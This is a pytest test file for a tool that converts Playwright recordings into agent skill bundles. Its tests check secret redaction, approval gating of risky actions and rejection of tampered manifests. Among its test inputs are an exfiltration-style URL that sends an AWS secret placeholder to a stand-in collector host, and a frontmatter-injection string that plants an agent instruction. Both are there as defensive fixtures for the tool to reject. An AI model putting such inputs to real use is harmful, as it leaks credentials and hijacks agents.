from __future__ import annotations

import ast
import hashlib
import json

import pytest

from flow2skill.exporter import render_skill, render_test, write_bundle
from flow2skill.model import Action, FlowValidationError, Selector, Workflow
from flow2skill.parser import parse_codegen

SOURCE = """from playwright.sync_api import Page, expect


def test_flow(page: Page) -> None:
    page.goto("https://app.example.test/login?token=literal-token&signature=literal-signature&tab=one")
    page.get_by_label("Email address").fill("dhiraj@example.test")
    page.get_by_label("Password").fill("literal-password")
    page.get_by_role("button", name="Sign in").click()
    expect(page.get_by_text("Welcome")).to_be_visible()
"""


def safe_workflow() -> Workflow:
    return Workflow(
        name="Safe flow",
        intent="Verify a page",
        start_url="https://example.test",
        actions=[
            Action("goto", Selector("page"), value="https://example.test"),
            Action("assert_visible", Selector("text", value="Ready"), expected=True),
        ],
    )


def test_parser_redacts_all_inputs_and_distinct_url_secrets_by_default() -> None:
    workflow = parse_codegen(SOURCE, name="Secure login")

    assert workflow.start_url == (
        "https://app.example.test/login?token=${F2S_URL_TOKEN}"
        "&signature=${F2S_URL_SIGNATURE}&tab=one"
    )
    assert workflow.variables == [
        "F2S_URL_TOKEN",
        "F2S_URL_SIGNATURE",
        "F2S_LABEL_EMAIL_ADDRESS_1",
        "F2S_LABEL_PASSWORD_2",
    ]
    assert workflow.actions[1].value == "${F2S_LABEL_EMAIL_ADDRESS_1}"
    assert workflow.actions[2].value == "${F2S_LABEL_PASSWORD_2}"
    assert workflow.actions[0].risk == "approval"
    assert workflow.actions[1].risk == "review"
    assert workflow.actions[-1].kind == "assert_visible"


def test_literal_input_opt_out_is_explicit_and_sensitive_fields_still_redact() -> None:
    source = """def test_search(page):
    page.goto("https://example.test")
    page.get_by_placeholder("Search").fill("public query")
    expect(page.get_by_text("Ready")).to_be_visible()
"""
    protected = parse_codegen(source, name="Protected")
    literal = parse_codegen(source, name="Literal", redact_all_inputs=False)
    assert protected.actions[1].value == "${F2S_PLACEHOLDER_SEARCH_1}"
    assert literal.actions[1].value == "public query"


def test_high_risk_click_is_approval_gated_and_other_mutations_require_review() -> None:
    source = """def test_publish(page):
    page.goto("https://example.test")
    page.get_by_label("Title").fill("release")
    page.get_by_role("button", name="Publish now").click()
    expect(page.get_by_text("Published")).to_be_visible()
"""
    workflow = parse_codegen(source, name="Publish")
    assert workflow.actions[1].risk == "review"
    assert workflow.actions[2].risk == "approval"
    assert "Approval required" in render_skill(workflow)
    assert "FLOW2SKILL_ALLOW_SIDE_EFFECTS" in render_test(workflow)


def test_selector_modifiers_are_preserved() -> None:
    source = """def test_nth(page):
    page.goto("https://example.test")
    page.get_by_role("button", name="Open").first.click()
    page.locator(".row").nth(2).hover()
    expect(page.get_by_text("Ready")).to_be_visible()
"""
    workflow = parse_codegen(source, name="Modifiers")
    assert workflow.actions[1].selector.modifiers == ("first",)
    assert workflow.actions[2].selector.modifiers == ("nth:2",)


def test_unsupported_calls_fail_closed_without_echoing_arguments() -> None:
    source = """def test_headers(page):
    page.goto("https://example.test")
    page.set_extra_http_headers({"Authorization": "HEADER_SECRET"})
    expect(page.get_by_text("Ready")).to_be_visible()
"""
    with pytest.raises(FlowValidationError) as captured:
        parse_codegen(source, name="Reject unsupported")
    assert "unsupported Playwright call" in str(captured.value)
    assert "HEADER_SECRET" not in str(captured.value)


def test_control_flow_context_managers_and_multiple_tests_fail_closed() -> None:
    control_flow = """def test_flow(page):
    if True:
        page.goto("https://example.test")
"""
    context_manager = """def test_flow(page):
    with page.expect_download():
        page.get_by_text("Download").click()
"""
    multiple = """def test_one(page):
    page.goto("https://example.test")

def test_two(page):
    page.goto("https://example.test")
"""
    with pytest.raises(FlowValidationError, match="Control flow"):
        parse_codegen(control_flow, name="Control")
    with pytest.raises(FlowValidationError, match="Control flow"):
        parse_codegen(context_manager, name="Context")
    with pytest.raises(FlowValidationError, match="exactly one"):
        parse_codegen(multiple, name="Multiple")


def test_to_have_text_remains_an_exact_assertion() -> None:
    source = """def test_exact(page):
    page.goto("https://example.test")
    expect(page.get_by_text("Result")).to_have_text("Exact result")
"""
    workflow = parse_codegen(source, name="Exact")
    assert workflow.actions[-1].kind == "assert_exact_text"
    generated = render_test(workflow)
    assert ".to_have_text(" in generated
    assert ".to_contain_text(" not in generated


def test_invalid_python_empty_capture_and_missing_assertion_fail_closed() -> None:
    with pytest.raises(FlowValidationError, match="not valid Python"):
        parse_codegen("def broken(:", name="Broken")
    with pytest.raises(FlowValidationError, match="exactly one"):
        parse_codegen("x = 1", name="Empty")
    with pytest.raises(FlowValidationError, match="No executable assertion"):
        parse_codegen(
            'def test_no_proof(page):\n    page.goto("https://example.test")\n',
            name="No proof",
        )


def test_bundle_contains_no_captured_secret_and_generated_python_parses(tmp_path) -> None:
    workflow = parse_codegen(SOURCE, name="Secure login")
    paths = write_bundle(workflow, tmp_path)
    combined = "\n".join(path.read_text(encoding="utf-8") for path in paths.values())

    for secret in (
        "literal-token",
        "literal-signature",
        "literal-password",
        "dhiraj@example.test",
    ):
        assert secret not in combined
    ast.parse(paths["test"].read_text(encoding="utf-8"))
    assert "fingerprint:" in paths["skill"].read_text(encoding="utf-8")
    assert json.loads(paths["flow_json"].read_text(encoding="utf-8"))["schema_version"] == "1.0"


def test_manifest_fingerprint_rejects_tampering() -> None:
    payload = safe_workflow().to_dict()
    payload["name"] = "Tampered"
    with pytest.raises(FlowValidationError, match="fingerprint"):
        Workflow.from_dict(payload)


def test_url_credentials_fragments_and_asserted_values_do_not_leak() -> None:
    source = """def test_secret_surfaces(page):
    page.goto("https://alice:USERINFO_SECRET@example.test/x#token=FRAGMENT_SECRET")
    page.get_by_label("Password").fill("VALUE_SECRET")
    expect(page.get_by_label("Password")).to_have_value("ASSERT_SECRET")
"""
    workflow = parse_codegen(source, name="Secret surfaces")
    bundle = json.dumps(workflow.to_dict()) + render_skill(workflow) + render_test(workflow)
    for secret in (
        "USERINFO_SECRET",
        "FRAGMENT_SECRET",
        "VALUE_SECRET",
        "ASSERT_SECRET",
    ):
        assert secret not in bundle
    assert {"F2S_URL_USERINFO", "F2S_URL_FRAGMENT_TOKEN"}.issubset(workflow.variables)


def test_dynamic_inputs_fail_closed_without_serializing_source_values() -> None:
    source = """def test_dynamic(page):
    page.goto(target_url)
    page.get_by_text(label).click()
"""
    with pytest.raises(FlowValidationError, match="dynamic or missing"):
        parse_codegen(source, name="Dynamic")


def test_manifest_cannot_downgrade_risk_even_with_recomputed_fingerprint() -> None:
    workflow = parse_codegen(
        """def test_publish(page):
    page.goto("https://example.test")
    page.get_by_role("button", name="Publish now").click()
    expect(page.get_by_text("Published")).to_be_visible()
""",
        name="Publish",
    )
    payload = workflow.to_dict()
    payload["actions"][1]["risk"] = "safe"
    unsigned = {key: value for key, value in payload.items() if key not in {"slug", "fingerprint"}}
    payload["fingerprint"] = hashlib.sha256(
        json.dumps(unsigned, sort_keys=True, separators=(",", ":")).encode()
    ).hexdigest()
    with pytest.raises(FlowValidationError, match="Risk classification mismatch"):
        Workflow.from_dict(payload)


def test_generated_test_is_valid_for_adversarial_text() -> None:
    workflow = parse_codegen(
        """def test_odd(page):
    page.goto("https://example.test")
    page.get_by_role("button", name="Odd\\n'\\\" label").click()
    expect(page.get_by_text("Ready")).to_be_visible()
""",
        name='Odd """ workflow',
    )
    ast.parse(render_test(workflow))


def test_manifest_requires_fingerprint_and_rejects_unknown_selector_fields() -> None:
    payload = safe_workflow().to_dict()
    payload.pop("fingerprint")
    with pytest.raises(FlowValidationError, match="fingerprint is required"):
        Workflow.from_dict(payload)

    payload = safe_workflow().to_dict()
    payload["actions"][0]["selector"]["extra"] = "no"
    with pytest.raises(FlowValidationError, match="Unknown selector fields"):
        Workflow.from_dict(payload)


def test_manifest_rejects_wrong_top_level_types_without_uncaught_errors() -> None:
    payload = safe_workflow().to_dict()
    payload["name"] = 7
    with pytest.raises(FlowValidationError, match="name must be a string"):
        Workflow.from_dict(payload)


def test_skill_frontmatter_quotes_multiline_intent_safely() -> None:
    workflow = safe_workflow()
    workflow.intent = 'First line\nsecond: "quoted"'
    skill = render_skill(workflow)
    description_line = next(line for line in skill.splitlines() if line.startswith("description:"))
    assert "\\n" in description_line
    assert description_line.count('"') >= 2


def test_foreign_environment_placeholders_are_rejected_and_never_resolved() -> None:
    source = """def test_exfiltration(page):
    page.goto("https://collector.invalid/?q=${AWS_SECRET_ACCESS_KEY}")
    expect(page.get_by_text("Ready")).to_be_visible()
"""
    with pytest.raises(FlowValidationError, match="captured placeholder syntax"):
        parse_codegen(source, name="Reject environment exfiltration")

    payload = safe_workflow().to_dict()
    payload["variables"] = ["AWS_SECRET_ACCESS_KEY"]
    payload["actions"][1]["selector"]["value"] = "${AWS_SECRET_ACCESS_KEY}"
    unsigned = {key: value for key, value in payload.items() if key not in {"slug", "fingerprint"}}
    payload["fingerprint"] = hashlib.sha256(
        json.dumps(unsigned, sort_keys=True, separators=(",", ":")).encode()
    ).hexdigest()
    with pytest.raises(FlowValidationError, match="F2S"):
        Workflow.from_dict(payload)


def test_echoed_protected_input_is_parameterized_everywhere() -> None:
    source = """def test_echo(page):
    page.goto("https://example.test")
    page.get_by_label("Search").fill("TOP_SECRET_TYPED")
    page.get_by_role("button", name="Search").click()
    expect(page.get_by_text("Results: TOP_SECRET_TYPED", exact=True)).to_be_visible()
"""
    workflow = parse_codegen(source, name="Echo protection")
    serialized = json.dumps(workflow.to_dict()) + render_skill(workflow) + render_test(workflow)
    assert "TOP_SECRET_TYPED" not in serialized
    assert workflow.actions[-1].selector.value == "Results: ${F2S_LABEL_SEARCH_1}"
    assert "get_by_text(resolve_template(" in render_test(workflow)


@pytest.mark.parametrize(
    "statement",
    [
        'page.get_by_role("button", name="Open", checked=True).click()',
        'page.get_by_role("button", name="Open").click(button="right")',
        'page.click("#submit", button="right")',
        'page.get_by_label("Search").fill("one", timeout=100)',
    ],
)
def test_unmodeled_selector_and_action_arguments_fail_closed(statement: str) -> None:
    source = f"""def test_shape(page):
    page.goto("https://example.test")
    {statement}
    expect(page.get_by_text("Ready")).to_be_visible()
"""
    with pytest.raises(FlowValidationError, match="cannot be replayed safely"):
        parse_codegen(source, name="Strict call shapes")


def test_decorated_or_fixture_dependent_tests_fail_closed() -> None:
    source = """@pytest.mark.browser
def test_flow(page, account):
    page.goto("https://example.test")
"""
    with pytest.raises(FlowValidationError, match="exactly one `page` argument"):
        parse_codegen(source, name="Reject hidden fixture semantics")


def test_overlapping_protected_inputs_do_not_leak_secret_suffixes() -> None:
    source = """def test_overlap(page):
    page.goto("https://example.test")
    page.get_by_label("Prefix").fill("prefix-")
    page.get_by_label("API token").fill("prefix-PRODUCTION-SECRET-7Q9X")
    expect(page.get_by_text("Result: prefix-PRODUCTION-SECRET-7Q9X", exact=True)).to_be_visible()
"""
    workflow = parse_codegen(source, name="Overlapping inputs")
    output = json.dumps(workflow.to_dict()) + render_skill(workflow) + render_test(workflow)
    assert "PRODUCTION-SECRET-7Q9X" not in output
    assert workflow.actions[-1].selector.value == "Result: ${F2S_LABEL_API_TOKEN_2}"


def test_nested_locator_scope_fails_closed_instead_of_de_scoping() -> None:
    source = """def test_nested(page):
    page.goto("https://example.test")
    page.locator("#safe-dialog").get_by_role("button", name="Save").click()
    expect(page.get_by_text("Saved")).to_be_visible()
"""
    with pytest.raises(FlowValidationError, match="dynamic or not portable"):
        parse_codegen(source, name="Nested locator")


def test_jwt_query_credentials_are_redacted() -> None:
    marker = "eyJhbGciOiJIUzI1NiJ9.payload.signature"
    source = f"""def test_jwt(page):
    page.goto("https://example.test/callback?jwt={marker}")
    expect(page.get_by_text("Ready")).to_be_visible()
"""
    workflow = parse_codegen(source, name="JWT URL")
    output = json.dumps(workflow.to_dict()) + render_skill(workflow) + render_test(workflow)
    assert marker not in output
    assert "F2S_URL_JWT" in workflow.variables


def test_manifest_rejects_unknown_selector_modifiers() -> None:
    payload = safe_workflow().to_dict()
    payload["actions"][1]["selector"]["modifiers"] = ["last"]
    unsigned = {key: value for key, value in payload.items() if key not in {"slug", "fingerprint"}}
    payload["fingerprint"] = hashlib.sha256(
        json.dumps(unsigned, sort_keys=True, separators=(",", ":")).encode()
    ).hexdigest()
    with pytest.raises(FlowValidationError, match="Unsupported selector modifier"):
        Workflow.from_dict(payload)


def test_manifest_source_cannot_inject_skill_frontmatter() -> None:
    payload = safe_workflow().to_dict()
    payload["source"] = "playwright-codegen\n---\nINJECTED_AGENT_INSTRUCTION"
    unsigned = {key: value for key, value in payload.items() if key not in {"slug", "fingerprint"}}
    payload["fingerprint"] = hashlib.sha256(
        json.dumps(unsigned, sort_keys=True, separators=(",", ":")).encode()
    ).hexdigest()
    with pytest.raises(FlowValidationError, match="source"):
        Workflow.from_dict(payload)


def test_bundle_removes_only_tests_owned_by_a_prior_valid_bundle(tmp_path) -> None:
    old_workflow = safe_workflow()
    old_workflow.name = "Old flow"
    old_paths = write_bundle(old_workflow, tmp_path)
    stale_generated = old_paths["test"]
    unrelated = tmp_path / "test_handwritten_business_rule.py"
    unrelated.write_text("HANDWRITTEN_RULE = True", encoding="utf-8")

    new_paths = write_bundle(safe_workflow(), tmp_path)

    assert not stale_generated.exists()
    assert unrelated.read_text(encoding="utf-8") == "HANDWRITTEN_RULE = True"
    assert new_paths["test"].exists()


def test_bundle_without_valid_ownership_manifest_preserves_unrelated_tests(tmp_path) -> None:
    unrelated = tmp_path / "test_handwritten_business_rule.py"
    unrelated.write_text("HANDWRITTEN_RULE = True", encoding="utf-8")

    write_bundle(safe_workflow(), tmp_path)

    assert unrelated.read_text(encoding="utf-8") == "HANDWRITTEN_RULE = True"
